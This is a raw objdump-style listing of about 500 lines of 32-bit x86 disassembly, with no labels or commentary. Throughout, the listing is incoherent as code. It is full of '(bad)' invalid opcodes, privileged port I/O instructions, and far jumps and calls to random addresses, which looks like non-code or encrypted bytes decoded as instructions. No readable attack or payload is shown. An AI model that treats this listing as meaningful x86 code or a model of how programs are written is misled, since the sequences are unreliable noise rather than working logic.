  4180c5:	test   DWORD PTR [edx+edx*1-0x28],eax
  4180c9:	push   ebx
  4180ca:	add    eax,0xd725f1b0
  4180cf:	jg     0x4180a3
  4180d1:	add    BYTE PTR [esi-0x3],dh
  4180d4:	and    eax,0x3d23d99d
  4180d9:	cdq    
  4180da:	(bad)
  4180df:	inc    ecx
  4180e0:	mov    edi,DWORD PTR [edi+0x6fdce3dd]
  4180e6:	test   BYTE PTR [ebp-0x9],0xf5
  4180ea:	(bad)  
  4180eb:	out    0x9,eax
  4180ed:	outs   dx,BYTE PTR ds:[esi]
  4180ee:	retf   
  4180ef:	dec    eax
  4180f0:	and    esp,eax
  4180f2:	adc    eax,DWORD PTR [ebp+0xd01e803]
  4180f8:	sub    eax,0xd808ae39
  4180fd:	imul   edx,ebx,0xfffffffb
  418100:	stos   BYTE PTR es:[edi],al
  418101:	or     al,0x15
  418103:	popf   
  418104:	mov    ah,dl
  418106:	imul   edi,esp,0xfffffffc
  418109:	mov    edx,0x88917f88
  41810e:	call   0x855b96f3
  418113:	mov    DWORD PTR [ecx],ebp
  418115:	push   ebx
  418116:	xchg   ebp,eax
  418117:	lods   al,BYTE PTR ds:[esi]
  418118:	scas   al,BYTE PTR es:[edi]
  418119:	xor    ch,bh
  41811b:	xlat   BYTE PTR ds:[ebx]
  41811c:	dec    ebp
  41811d:	clc    
  41811e:	xchg   ebx,eax
  41811f:	pushf  
  418120:	pop    ss
  418121:	cmp    dl,bl
  418123:	inc    ecx
  418124:	jo     0x4180cf
  418126:	je     0x41813c
  418128:	mov    eax,ss:0x8b8e0a79
  41812e:	out    dx,al
  41812f:	or     esi,DWORD PTR [ebp-0x69527a8b]
  418135:	sbb    BYTE PTR [eax],ah
  418137:	sub    ch,BYTE PTR fs:[edi+0x71cca0c9]
  41813e:	add    esp,DWORD PTR [eax]
  418140:	and    BYTE PTR [ebx+eax*1-0x4c],cl
  418144:	mov    edx,0x8de1b17
  418149:	lods   eax,DWORD PTR fs:[esi]
  41814b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41814c:	imul   esi,ebx,0xffffffc6
  41814f:	mov    dl,0xd
  418151:	sub    eax,0xe3dd6632
  418156:	and    eax,0xe92da5d8
  41815b:	push   ss
  41815c:	sub    dl,cl
  41815e:	xor    esi,DWORD PTR [esp+ebp*4-0xebed715]
  418165:	mov    ebx,0x29aeef89
  41816a:	adc    eax,0xe1f61ef6
  41816f:	sbb    BYTE PTR [ebx],0x9b
  418172:	xchg   ecx,eax
  418173:	std    
  418174:	xchg   ebx,eax
  418175:	lahf   
  418176:	into   
  418177:	inc    edi
  418178:	mov    al,ds:0x7eef54fd
  41817d:	jae    0x418168
  41817f:	mov    edi,0x74b06487
  418184:	sbb    ecx,DWORD PTR [edi+0x57]
  418187:	add    al,0x57
  418189:	sub    eax,0xfdcdc7dd
  41818e:	mov    al,0xd5
  418190:	mov    BYTE PTR [edi+eax*1],bh
  418193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418194:	jne    0x41811a
  418196:	jno    0x4181a2
  418198:	pushf  
  418199:	in     eax,dx
  41819a:	clc    
  41819b:	imul   eax,DWORD PTR gs:[eax+0x59],0xe931b5f
  4181a3:	nop
  4181a4:	loop   0x418126
  4181a6:	add    esp,DWORD PTR [edx]
  4181a8:	jg     0x41817a
  4181aa:	dec    ebx
  4181ab:	dec    ebx
  4181ac:	xchg   edx,eax
  4181ad:	cmp    BYTE PTR [esi-0x55],0xbc
  4181b1:	fisttp QWORD PTR [edi-0x47]
  4181b4:	std    
  4181b5:	add    al,0x53
  4181b7:	outs   dx,BYTE PTR ds:[esi]
  4181b8:	add    BYTE PTR [esi+0x6e92ec51],0xd2
  4181bf:	inc    edx
  4181c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181c1:	xchg   ebp,eax
  4181c2:	cdq    
  4181c3:	pop    edi
  4181c4:	sub    ch,dh
  4181c6:	mov    esi,0xef37d748
  4181cb:	push   ecx
  4181cc:	push   esi
  4181cd:	mov    al,BYTE PTR [ebx-0x6e]
  4181d0:	cs ins BYTE PTR es:[edi],dx
  4181d2:	pop    esi
  4181d3:	adc    al,0x58
  4181d5:	lds    edx,FWORD PTR [ecx]
  4181d7:	popa   
  4181d8:	dec    esp
  4181d9:	fsubr  QWORD PTR [eax]
  4181db:	mov    ds:0xf8d6c120,eax
  4181e0:	sbb    BYTE PTR [ebx+0x1e93457],al
  4181e6:	addr16 and eax,0xf95fd1e
  4181ec:	adc    eax,0xc9d18e39
  4181f1:	add    DWORD PTR [ebp-0x3478eb03],ecx
  4181f7:	out    0x3d,al
  4181f9:	cmc    
  4181fa:	repz pop es
  4181fc:	mov    eax,ds:0xb25b03e6
  418201:	adc    DWORD PTR ds:0x96137d0c,edx
  418207:	cs loopne 0x4181fb
  41820a:	mov    al,0x25
  41820c:	xchg   esi,eax
  41820d:	sub    BYTE PTR [esi],dh
  41820f:	or     BYTE PTR [edi],cl
  418211:	lds    esi,FWORD PTR [eax+0x2efc1869]
  418217:	adc    al,0x68
  418219:	aad    0x35
  41821b:	cmp    al,0x5d
  41821d:	(bad)  [ecx+0x2b]
  418220:	in     al,dx
  418221:	into   
  418222:	adc    DWORD PTR ds:0xddd9003d,ecx
  418228:	inc    eax
  418229:	xchg   edx,eax
  41822a:	hlt    
  41822b:	aas    
  41822c:	shl    BYTE PTR [ebx+0x3a],1
  41822f:	mov    ebx,0x76376269
  418234:	cmp    edi,DWORD PTR [edi+eiz*4-0x6e8c75f7]
  41823b:	dec    eax
  41823c:	mov    esi,0xee606f1c
  418241:	push   edi
  418242:	call   0x3c548030
  418247:	push   0x85b3f9f4
  41824c:	into   
  41824d:	fisubr WORD PTR ds:[ecx]
  418250:	dec    ecx
  418251:	push   ebp
  418252:	inc    ebx
  418253:	adc    edx,DWORD PTR [ebp-0x62]
  418256:	sbb    BYTE PTR [edx+0x39],al
  418259:	adc    BYTE PTR ds:0x32c9b989,dl
  41825f:	out    dx,eax
  418260:	adc    BYTE PTR [eax+0x26],cl
  418263:	test   eax,0x7aa847c7
  418268:	sbb    al,BYTE PTR [esi]
  41826a:	adc    dh,0xd6
  41826d:	stc    
  41826e:	push   es
  41826f:	jl     0x4182b8
  418271:	sbb    esp,eax
  418273:	out    0xc4,al
  418275:	ret    
  418276:	stc    
  418277:	retf   0x8ca1
  41827a:	cdq    
  41827b:	xchg   ecx,eax
  41827c:	test   BYTE PTR [edx+0x8],dh
  41827f:	sub    DWORD PTR [ecx+0x71],ebp
  418282:	outs   dx,BYTE PTR ds:[esi]
  418283:	ds int3 
  418285:	in     al,dx
  418286:	cli    
  418287:	lods   eax,DWORD PTR ds:[esi]
  418288:	sbb    BYTE PTR [esp+eax*1+0x1d32bed2],cl
  41828f:	push   0x3824158c
  418294:	sub    ch,BYTE PTR [ecx]
  418296:	mov    bl,0x60
  418298:	or     ebx,ecx
  41829a:	mov    ecx,0xcb10dc48
  41829f:	aad    0x6b
  4182a1:	pop    ecx
  4182a2:	(bad)  
  4182a3:	aad    0x7
  4182a5:	mov    bl,0x9d
  4182a7:	cld    
  4182a8:	pop    esp
  4182a9:	jecxz  0x41825c
  4182ab:	add    eax,0xac04cc86
  4182b0:	pop    ds
  4182b1:	jle    0x4182c7
  4182b3:	xchg   esp,eax
  4182b4:	sbb    dl,dh
  4182b6:	mov    esp,DWORD PTR [eax+0x4141c9c7]
  4182bc:	inc    esp
  4182bd:	fs adc al,0x9f
  4182c0:	mov    eax,0xa8b8f9af
  4182c5:	xchg   ecx,eax
  4182c6:	int3   
  4182c7:	retf   0x5996
  4182ca:	jge    0x41831c
  4182cc:	cmc    
  4182cd:	jmp    0x71565b31
  4182d2:	int    0x5b
  4182d4:	ret    
  4182d5:	ret    0xf193
  4182d8:	cmp    BYTE PTR [eax-0x48],al
  4182db:	cli    
  4182dc:	jecxz  0x418300
  4182de:	in     al,0x24
  4182e0:	mov    ebx,0xc01b5a07
  4182e5:	mov    ecx,0xa3eec90c
  4182ea:	mov    bl,dl
  4182ec:	mov    edx,0x2497cc8c
  4182f1:	shr    BYTE PTR [ebp+0x9],cl
  4182f4:	imul   ebx,DWORD PTR [edi-0x49],0x7a41d0d3
  4182fb:	inc    edx
  4182fc:	mov    bl,0xe9
  4182fe:	(bad)  [edx]
  418300:	push   es
  418301:	ret    0x6ccb
  418304:	cs pusha 
  418306:	retf   0xeb4f
  418309:	mov    ebx,DWORD PTR [edx]
  41830b:	icebp  
  41830c:	fwait
  41830d:	xchg   esi,eax
  41830e:	jge    0x418369
  418310:	xor    edi,DWORD PTR [esi-0x5af4255d]
  418316:	and    ebx,DWORD PTR [esi-0x28]
  418319:	cmp    eax,0x6412436e
  41831e:	arpl   WORD PTR [ebx],bx
  418320:	mov    edi,0x250dbdbe
  418325:	xchg   esi,eax
  418326:	sbb    eax,0x59989eb2
  41832b:	cld    
  41832c:	pushf  
  41832d:	rcl    dh,0x2e
  418330:	push   es
  418331:	jb     0x418326
  418333:	pop    ebp
  418334:	mov    ecx,0x24236531
  418339:	shr    BYTE PTR [ebx],0x6e
  41833c:	lea    ebx,[edx-0x14d24830]
  418342:	cmp    cl,BYTE PTR [esi-0x66ce4f4e]
  418348:	inc    esi
  418349:	test   eax,0xb5f1c008
  41834e:	inc    esp
  41834f:	xor    BYTE PTR [ebp-0x1],cl
  418352:	mov    cl,0x6c
  418354:	test   al,0x7b
  418356:	and    eax,0xc43f70c
  41835b:	cmp    dl,al
  41835d:	(bad)  
  41835e:	inc    edx
  41835f:	sub    ecx,DWORD PTR ds:0x3642635a
  418365:	pop    edx
  418366:	xchg   ebx,eax
  418367:	mov    cl,al
  418369:	pop    ds
  41836a:	imul   edi,DWORD PTR ds:0x2d74309f,0xffffffe7
  418371:	and    eax,0x1246308
  418376:	nop
  418377:	leave  
  418378:	jo     0x4183b7
  41837a:	xor    esi,DWORD PTR ds:0x38f46b68
  418380:	sub    bh,BYTE PTR [eax]
  418382:	stos   BYTE PTR es:[edi],al
  418383:	push   esp
  418384:	pop    ss
  418385:	es ds icebp 
  418388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418389:	mov    eax,ecx
  41838b:	cmp    esp,DWORD PTR [ebx+eiz*8+0x5918e588]
  418392:	and    al,dh
  418394:	xor    eax,0xb158a27a
  418399:	(bad)  
  41839a:	mov    cl,0x48
  41839c:	dec    ebp
  41839d:	sar    DWORD PTR [edx+0x3137f8a],1
  4183a3:	mov    eax,ds:0x58651d12
  4183a8:	shl    BYTE PTR ds:0xbe216ecf,0x24
  4183af:	daa    
  4183b0:	sub    ah,BYTE PTR [ecx+0x2c]
  4183b3:	xor    dh,dl
  4183b5:	scas   eax,DWORD PTR es:[edi]
  4183b6:	jge    0x418375
  4183b8:	repnz test eax,0x501acf52
  4183be:	not    BYTE PTR [eax]
  4183c0:	or     eax,DWORD PTR [ecx-0x14d80c39]
  4183c6:	xchg   esi,eax
  4183c7:	outs   dx,BYTE PTR ds:[esi]
  4183c8:	mov    esi,0xbcb6de95
  4183cd:	gs sub al,0xc8
  4183d0:	outs   dx,BYTE PTR ds:[esi]
  4183d1:	or     ch,BYTE PTR [ebx+0x71]
  4183d4:	cs push ecx
  4183d6:	inc    edi
  4183d7:	js     0x418406
  4183d9:	pop    ebx
  4183da:	call   0xb48f1c70
  4183df:	inc    edx
  4183e0:	sub    ebx,ebp
  4183e2:	push   edi
  4183e3:	mov    edx,0x9456891b
  4183e8:	jno    0x41839e
  4183ea:	pusha  
  4183eb:	cmp    DWORD PTR [ebx+0x23],ebp
  4183ee:	stos   BYTE PTR es:[edi],al
  4183ef:	retf   0x4ab1
  4183f2:	pop    ecx
  4183f3:	dec    ebp
  4183f4:	xchg   edx,eax
  4183f5:	push   eax
  4183f6:	pushw  cs
  4183f8:	das    
  4183f9:	test   BYTE PTR [eax],0xe0
  4183fc:	cmp    eax,0x56c1b60d
  418401:	daa    
  418402:	xor    eax,0x640f8cc3
  418407:	sub    DWORD PTR [edx-0x7ecd9830],eax
  41840d:	sub    esp,DWORD PTR [esi-0x63]
  418410:	cmp    eax,0x734e8334
  418415:	test   al,0x1a
  418417:	jl     0x4183f5
  418419:	enter  0x100d,0x5f
  41841d:	test   eax,edi
  41841f:	mov    ds,esp
  418421:	pop    edx
  418422:	dec    ebx
  418423:	retf   
  418424:	imul   dh
  418426:	mov    cs,WORD PTR [ebp+0x26aaa432]
  41842c:	pop    ebp
  41842d:	push   esi
  41842e:	je     0x418462
  418430:	stos   BYTE PTR es:[edi],al
  418431:	mov    dh,BYTE PTR [eax+0xe25e071]
  418437:	stos   BYTE PTR es:[edi],al
  418438:	xor    al,BYTE PTR [ecx]
  41843a:	or     ebp,DWORD PTR [ecx-0x31657f43]
  418440:	mov    cl,0xf6
  418442:	add    cl,dh
  418444:	mov    ds:0xf9feb831,eax
  418449:	adc    DWORD PTR [ebx+0x26001f1a],edi
  41844f:	scas   eax,DWORD PTR es:[edi]
  418450:	loopne 0x41848b
  418452:	xchg   edx,eax
  418453:	std    
  418454:	sbb    eax,ecx
  418456:	cdq    
  418457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418458:	sub    cl,cl
  41845a:	test   DWORD PTR [esi],0x668bc415
  418460:	add    eax,0xcd28e1f4
  418465:	mov    ds:0xe8237f88,al
  41846a:	pushf  
  41846b:	fucomp st(6)
  41846d:	pop    ebp
  41846e:	push   ss
  41846f:	push   ecx
  418470:	into   
  418471:	xor    edi,DWORD PTR [edx+0x65]
  418474:	(bad)  
  418475:	adc    edx,edi
  418477:	sub    eax,0xa226def9
  41847d:	xor    eax,0xef1b31b4
  418482:	ja     0x418479
  418484:	shl    DWORD PTR [ecx-0x79],cl
  418487:	xor    al,BYTE PTR [eax]
  418489:	icebp  
  41848a:	add    eax,0x924cf1ab
  41848f:	push   ebx
  418490:	pop    ds
  418491:	mov    cl,0xe
  418493:	test   DWORD PTR [ecx],esp
  418495:	mov    ds:0xfc72e148,eax
  41849a:	sub    ebx,DWORD PTR [ebx+0x5f]
  41849d:	(bad)  
  41849e:	mov    bh,0x70
  4184a0:	cli    
  4184a1:	mov    dh,BYTE PTR [bp+si-0x1805]
  4184a6:	jmp    0x2b3fa4a8
  4184ab:	push   esi
  4184ac:	je     0x4184be
  4184ae:	ss or  al,0x48
  4184b1:	stc    
  4184b2:	mov    al,ds:0x99cf363c
  4184b7:	mov    ch,0xc8
  4184b9:	push   edi
  4184ba:	push   ebp
  4184bb:	sbb    esp,ebp
  4184bd:	jae    0x418463
  4184bf:	pop    esp
  4184c0:	jg     0x41847c
  4184c2:	test   BYTE PTR [ebx-0x74],0x78
  4184c6:	retf   
  4184c7:	lahf   
  4184c8:	mov    ecx,0x8aab643f
  4184cd:	sbb    al,0xfc
  4184cf:	lahf   
  4184d0:	inc    esp
  4184d1:	or     eax,ebx
  4184d3:	in     al,0x1a
  4184d5:	jecxz  0x4184b9
  4184d7:	ins    BYTE PTR es:[edi],dx
  4184d8:	sbb    DWORD PTR [edx],edi
  4184da:	jg     0x41852f
  4184dc:	cmp    dl,ch
  4184de:	ret    0x7f09
  4184e1:	stos   BYTE PTR es:[edi],al
  4184e2:	push   cs
  4184e3:	scas   eax,DWORD PTR es:[edi]
  4184e4:	imul   ebx,edi,0xffffffae
  4184e7:	test   BYTE PTR es:[eax+0x43fcc887],bl
  4184ee:	push   ebp
  4184ef:	dec    edi
  4184f0:	sub    DWORD PTR [esi],ebx
  4184f2:	pushf  
  4184f3:	in     eax,dx
  4184f4:	and    eax,0xd09ddf8b
  4184f9:	cmp    BYTE PTR [ebx-0x5b],0xec
  4184fd:	jg     0x418537
  4184ff:	mov    dh,0x2a
  418501:	iret   
  418502:	or     edi,edx
  418504:	cmp    DWORD PTR [esi],0xffffffd6
  418507:	inc    eax
  418508:	js     0x41848f
  41850a:	stos   BYTE PTR es:[edi],al
  41850b:	mov    al,ds:0xf18d174a
  418510:	std    
  418511:	xor    al,0x59
  418513:	neg    DWORD PTR [ebp-0x1c]
  418516:	jne    0x41855b
  418518:	stos   DWORD PTR es:[edi],eax
  418519:	sti    
  41851a:	stos   DWORD PTR es:[edi],eax
  41851b:	and    al,0x21
  41851d:	nop
  41851e:	retf   
  41851f:	lea    esi,[edi-0x77628761]
  418525:	or     ebp,DWORD PTR [ebx+ecx*1]
  418528:	retf   
  418529:	cs dec edi
  41852b:	addr16 sbb eax,0xccff38e4
  418531:	pusha  
  418532:	out    0x15,eax
  418534:	xchg   BYTE PTR [ebx+0x21],dh
  418537:	jno    0x4185b0
  418539:	fdiv   QWORD PTR [ebx]
  41853b:	in     al,0xaf
  41853d:	aaa    
  41853e:	sub    DWORD PTR [edx],edx
  418540:	icebp  
  418541:	jp     0x4185a0
  418543:	inc    ecx
  418544:	cld    
  418545:	sub    al,0x8d
  418547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418548:	or     DWORD PTR [edi+esi*4-0x1ac956bd],ecx
  41854f:	xlat   BYTE PTR ds:[ebx]
  418550:	and    al,0x4e
  418552:	mov    ecx,0x8b4e3fc2
  418557:	mov    ds:0x135eaa1e,al
  41855c:	scas   al,BYTE PTR es:[edi]
  41855d:	cmc    
  41855e:	pop    edi
  41855f:	loopne 0x418517
  418561:	and    esp,0xffffffb5
  418564:	div    DWORD PTR [eax]
  418566:	jl     0x418545
  418568:	sbb    eax,0x6cdcde0a
  41856d:	ins    DWORD PTR es:[edi],dx
  41856e:	cs pop eax
  418570:	inc    ecx
  418571:	inc    bx
  418573:	cmp    DWORD PTR [esi],esi
  418575:	sbb    esp,DWORD PTR [eax]
  418577:	or     esi,DWORD PTR [esi]
  418579:	lock outs dx,DWORD PTR ds:[esi]
  41857b:	into   
  41857c:	call   0x5e15bfdd
  418581:	mov    eax,ds:0xa06fed95
  418586:	mov    WORD PTR [edx+ebx*2-0x40],es
  41858a:	cmp    al,0x99
  41858c:	pop    eax
  41858d:	das    
  41858e:	push   cs
  41858f:	mov    BYTE PTR [edx],bl
  418591:	sahf   
  418592:	fbstp  TBYTE PTR [edx+0x2f06101e]
  418598:	add    esi,DWORD PTR [edi]
  41859a:	mov    eax,0x98bd5d61
  41859f:	ret    0x607c
  4185a2:	mov    dh,0x34
  4185a4:	push   ds
  4185a5:	adc    DWORD PTR [ebx],0xffffffa9
  4185a8:	aad    0xa9
  4185aa:	or     eax,0xe483cd42
  4185af:	inc    eax
  4185b0:	out    dx,al
  4185b1:	lock mov eax,0xea4bdfeb
  4185b7:	sti    
  4185b8:	add    DWORD PTR [esp+edx*8],edx
  4185bb:	and    BYTE PTR [edx-0x1c],0x78
  4185bf:	stos   DWORD PTR es:[edi],eax
  4185c0:	js     0x4185aa
  4185c2:	arpl   WORD PTR [esp+eiz*4],ax
  4185c5:	cmc    
  4185c6:	xchg   BYTE PTR [esi-0x16f2d171],ah
  4185cc:	adc    cl,al
  4185ce:	cmp    eax,0xd0b1d3f9
  4185d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d4:	pop    es
  4185d5:	jmp    0x3821:0x53f22906
  4185dc:	imul   edi,esp,0x6930bfac
  4185e2:	fwait
  4185e3:	inc    eax
  4185e4:	pop    edx
  4185e5:	sbb    BYTE PTR [esi],bl
  4185e7:	and    al,0x8c
  4185e9:	xor    eax,0x40996b2c
  4185ee:	jno    0x4185cf
  4185f0:	dec    ecx
  4185f1:	mov    al,0x5b
  4185f3:	sbb    eax,0xc6fcbefa
  4185f8:	ds nop
  4185fa:	jmp    0x2b460c1
  4185ff:	ins    DWORD PTR es:[edi],dx
  418600:	rol    BYTE PTR ds:0x2136d85,1
  418606:	(bad)  
  418607:	and    DWORD PTR [esi+eax*8],edx
  41860a:	jl     0x418632
  41860c:	aad    0x2c
  41860e:	mov    eax,0x8a1ef6f7
  418613:	pusha  
  418614:	int    0x92
  418616:	or     esi,DWORD PTR [ebx+edi*8+0x5c]
  41861a:	inc    edx
  41861b:	add    DWORD PTR [ebx],esp
  41861d:	mov    bh,0x69
  41861f:	les    ebx,FWORD PTR [esi+0x5977dadf]
  418625:	(bad)  
  418626:	(bad)  
  418627:	jb     0x41860c
  418629:	dec    esp
  41862a:	mov    edx,0x1c201546
  41862f:	sbb    ecx,esi
  418631:	loope  0x4185e1
  418633:	sahf   
  418634:	sti    
  418635:	add    eax,DWORD PTR [ebp-0x4c2b5c8b]
  41863b:	cmp    eax,0x2a850156
  418640:	out    0xf3,eax
  418642:	xor    eax,0xc875ca95
  418647:	dec    eax
  418648:	dec    ebp
  418649:	mov    bl,dl
  41864b:	shr    edi,cl
  41864d:	out    dx,al
  41864e:	fwait
  41864f:	dec    ch
  418651:	adc    eax,0x65cec78e
  418656:	js     0x4185e1
  418658:	xchg   DWORD PTR [esi],ebp
  41865a:	aam    0x87
  41865c:	fldenv [ecx-0x35d0f727]
  418662:	mov    bl,0x23
  418664:	shr    BYTE PTR [ebx-0x31],1
  418667:	cmp    ch,ch
  418669:	ss bnd jmp 0x986279ee
  418670:	pop    ds
  418671:	jae    0x418637
  418673:	pop    es
  418674:	mov    cl,0xfd
  418676:	sti    
  418677:	or     bl,BYTE PTR [esp+esi*1]
  41867a:	dec    esp
  41867b:	fild   WORD PTR [ecx+0x4cec6c93]
  418681:	(bad)  [ebx]
  418683:	in     al,0xad
  418685:	push   ds
  418686:	add    DWORD PTR [ecx-0x2e],esp
  418689:	jp     0x4186f3
  41868b:	bnd jp 0x418632
  41868e:	outs   dx,DWORD PTR ds:[esi]
  41868f:	and    dl,0xc4
  418692:	retf   0x388
  418695:	push   eax
  418696:	bound  esp,QWORD PTR [ebx]
  418698:	mov    ecx,DWORD PTR [eax-0x7b]
  41869b:	aas    
  41869c:	push   0xffffff91
  41869e:	leave  
  41869f:	mov    ah,0xb0
  4186a1:	dec    esp
  4186a2:	sub    DWORD PTR [ebp+0x6a4d91dd],edi
  4186a8:	stos   BYTE PTR es:[edi],al
  4186a9:	sahf   
  4186aa:	fdivr  st,st(5)
  4186ac:	jg     0x41864f
  4186ae:	in     eax,dx
  4186af:	es pop esi
  4186b1:	jb     0x4186d1
  4186b3:	mov    al,ch
  4186b5:	mov    bh,0x9f
  4186b7:	test   eax,0x2d702013
  4186bc:	and    BYTE PTR [edx-0x7cc207b9],0x7c
  4186c3:	sahf   
  4186c4:	push   ds
  4186c5:	push   ebx
  4186c6:	adc    al,0x1e
  4186c8:	add    BYTE PTR [edi],ch
  4186ca:	mov    ebx,0x485a16d4
  4186cf:	mov    eax,ds:0x403281d3
  4186d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186d5:	lea    esp,[ecx+eax*8+0x73]
  4186d9:	jnp    0x418699
  4186db:	xchg   al,dl
  4186dd:	and    ah,BYTE PTR [edi-0xc]
  4186e0:	mov    BYTE PTR [ecx],dl
  4186e2:	pusha  
  4186e3:	aaa    
  4186e4:	pushf  
  4186e5:	scas   al,BYTE PTR es:[edi]
  4186e6:	(bad)  
  4186e8:	(bad)  
  4186e9:	gs pop ecx
  4186eb:	pop    esi
  4186ec:	mov    ds:0x85f80c08,al
  4186f1:	aad    0xed
  4186f3:	mov    esp,DWORD PTR [esi+0x1e]
  4186f6:	ror    DWORD PTR [eax-0x4c],cl
  4186f9:	cmp    BYTE PTR [edx],ch
  4186fb:	loope  0x418694
  4186fd:	test   al,0xf5
  4186ff:	pop    DWORD PTR [edi-0x20672dd9]
  418705:	arpl   bp,dx
  418707:	jae    0x418708
  418709:	push   0x5f
  41870b:	add    al,BYTE PTR [eax]
  41870d:	cmp    eax,0x823f9566
  418712:	sbb    DWORD PTR [ecx-0x4e],edi
  418715:	sub    ebp,ecx
  418717:	ret    0xe2e9
  41871a:	pop    es
  41871b:	scas   al,BYTE PTR es:[edi]
  41871c:	sbb    DWORD PTR [eax+0x30],eax
  41871f:	ins    BYTE PTR es:[edi],dx
  418720:	cli    
  418721:	adc    al,0xd
  418723:	jge    0x4186f7
  418725:	(bad)  
  418726:	sbb    al,0xb5
  418728:	in     al,dx
  418729:	pop    edi
  41872b:	std    
  41872c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872d:	push   ebx
  41872e:	dec    edi
  41872f:	loopne 0x418790
  418731:	and    BYTE PTR [ebx-0x6a],dl
  418734:	mov    eax,ds:0x3fa2a9e2
  418739:	adc    eax,esp
  41873b:	shl    edi,0x4c
  41873e:	nop
  41873f:	lods   eax,DWORD PTR ds:[esi]
  418740:	xchg   edi,eax
  418741:	ror    DWORD PTR [esi+0x67],1
  418744:	jnp    0x418726
  418746:	ja     0x4187a9
  418748:	cdq    
  418749:	xlat   BYTE PTR ds:[ebx]
  41874a:	jnp    0x4187a7
  41874c:	inc    esi
  41874d:	ja     0x4186f9
  41874f:	in     al,0xfe
  418751:	retf   
  418752:	pop    esp
  418753:	jne    0x4187d3
  418755:	xchg   edx,eax
  418756:	mov    BYTE PTR ds:0xdaa77675,al
  41875c:	push   ds
  41875d:	jbe    0x418778
  41875f:	aad    0xb5
  418761:	aad    0xc7
  418763:	iret   
  418764:	imul   DWORD PTR [eax+edi*2-0x2ad97f81]
  41876b:	loope  0x418720
  41876d:	fisubr WORD PTR [esi+0x67]
  418770:	ins    BYTE PTR es:[edi],dx
  418771:	je     0x418741
  418773:	sub    BYTE PTR [edi],dh
  418775:	xor    eax,DWORD PTR fs:[esi]
  418778:	jo     0x4187b3
  41877a:	ins    BYTE PTR es:[edi],dx
  41877b:	mov    edi,0x36f25abb
  418780:	pop    ebx
  418781:	lods   al,BYTE PTR ds:[esi]
  418782:	inc    esi
  418783:	ret    
  418784:	out    0x9b,eax
  418786:	inc    eax
  418787:	xor    esi,DWORD PTR [ecx-0x7632875b]
  41878d:	lea    eax,[edx-0xd]
  418790:	cmp    bh,BYTE PTR [esi]
  418792:	sub    ecx,DWORD PTR [ebp+0x72]
  418795:	iret   
  418796:	outs   dx,DWORD PTR ds:[esi]
  418797:	(bad)  
  418799:	test   al,0xd5
  41879b:	sub    cl,BYTE PTR [esi+0x68d1f5b0]
  4187a1:	enter  0xcb73,0x92
  4187a5:	adc    bh,BYTE PTR [ecx]
  4187a7:	mov    esp,0x8593fede
  4187ac:	jp     0x41879f
  4187ae:	xchg   ecx,eax
  4187af:	div    DWORD PTR ds:0x8e87330a
  4187b5:	push   ebp
  4187b6:	xchg   DWORD PTR [ebp+0x9558cf0],edi
  4187bc:	test   ch,bl
  4187be:	push   ebx
  4187bf:	sbb    esp,esp
  4187c1:	sar    BYTE PTR [ebx-0x3a],1
  4187c4:	pop    es
  4187c5:	mov    esi,0x1083f14f
  4187ca:	push   edi
  4187cb:	mov    fs,esp
  4187cd:	repnz mov eax,ds:0x73131c87
  4187d3:	jl     0x4187bf
  4187d5:	pop    ebp
  4187d6:	std    
  4187d7:	pop    eax
  4187d8:	and    BYTE PTR [esp+0x1c],ah
  4187dc:	outs   dx,DWORD PTR ds:[esi]
  4187dd:	test   al,0xf8
  4187df:	jbe    0x41880f
  4187e1:	push   ss
  4187e2:	lods   eax,DWORD PTR ds:[esi]
  4187e3:	xchg   esp,eax
  4187e4:	fucom  st(2)
  4187e6:	xor    ecx,edx
  4187e8:	or     eax,eax
  4187ea:	jmp    0xe043:0x429568b3
  4187f1:	push   0x2caba4bc
  4187f6:	aas    
  4187f7:	retf   0xf0e2
  4187fa:	in     al,0x4a
  4187fc:	scas   al,BYTE PTR es:[edi]
  4187fd:	push   ebx
  4187fe:	pop    esp
  4187ff:	or     ebx,ebx
  418801:	std    
  418802:	mov    ebx,0x28301229
  418807:	xor    DWORD PTR gs:[ecx],esp
  41880a:	inc    ecx
  41880b:	pusha  
  41880c:	cli    
  41880d:	outs   dx,DWORD PTR ds:[esi]
  41880e:	jae    0x4187da
  418810:	in     eax,0x79
  418812:	lea    edi,[edi]
  418814:	je     0x4187a0
  418816:	dec    ebp
  418817:	(bad)  [edi-0x21614242]
  41881d:	push   ss
  41881e:	test   BYTE PTR [ebx+0x76fb0177],dh
  418824:	sub    bl,BYTE PTR [edx+edx*2]
  418827:	jp     0x4187fd
  418829:	pop    ebx
  41882a:	inc    ebp
  41882b:	aad    0x8f
  41882d:	cmp    al,BYTE PTR [eax-0x6e]
  418830:	cmp    bl,BYTE PTR [ecx+0x54973e63]
  418836:	mov    ebp,0x28e10a29
  41883b:	sbb    BYTE PTR [esi+edx*2-0x6f],ah
  41883f:	and    BYTE PTR [ecx+0x511186a3],ah
  418845:	popf   
  418846:	mov    al,ds:0x3aa8b664
  41884b:	shl    ah,cl
  41884d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41884e:	in     eax,dx
  41884f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418850:	ror    BYTE PTR [ebx-0x55edf38e],1
  418856:	mov    cl,0xe9
  418858:	loop   0x4188ab
  41885a:	push   es
  41885b:	fld    TBYTE PTR ds:[edi]
  41885e:	push   cs
  41885f:	sub    al,0x38
  418861:	push   ebp
  418862:	test   WORD PTR ds:0x3352f12c,cx
  418869:	inc    esp
  41886a:	pop    esp
  41886b:	sub    BYTE PTR [edx-0x7a],dl
  41886e:	mov    al,ds:0x414f28e0
  418873:	inc    edi
  418874:	push   cs
  418875:	push   ebp
  418876:	mov    dh,bl
  418878:	(bad)  
  418879:	(bad)  
  41887a:	jmp    0x84acd153
  41887f:	daa    
  418880:	push   es
  418881:	or     al,0x6f
  418883:	xor    DWORD PTR [edi-0x15427587],0x31
  41888a:	(bad)  
  41888b:	int    0x6d
  41888d:	(bad)  
  41888e:	mov    bh,0xc8
  418890:	inc    eax
  418891:	into   
  418892:	pop    eax
  418893:	inc    ecx
  418894:	aad    0xa1
  418896:	mov    ebx,0xfc054f4d
